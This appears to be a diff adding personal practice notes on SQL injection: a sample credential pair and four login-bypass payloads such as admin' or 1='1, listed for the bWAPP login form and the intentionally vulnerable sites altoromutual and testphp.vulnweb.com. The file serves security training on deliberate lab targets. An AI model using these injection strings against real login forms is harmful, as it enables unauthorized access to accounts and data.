@@ -1,0 +1,11 @@
+user='admin' & pass='123@@msn#'
+
+1.admin' or 1='1
+2.admin' or '1'='1
+3.user1234@gmail.com' or 1='1
+4.user1234@gmail.com' or '1'='1
+
+Application: Bwapp---login form/hero
+sites:
+1-altoromutual
+2-testphp.vulnweb.com
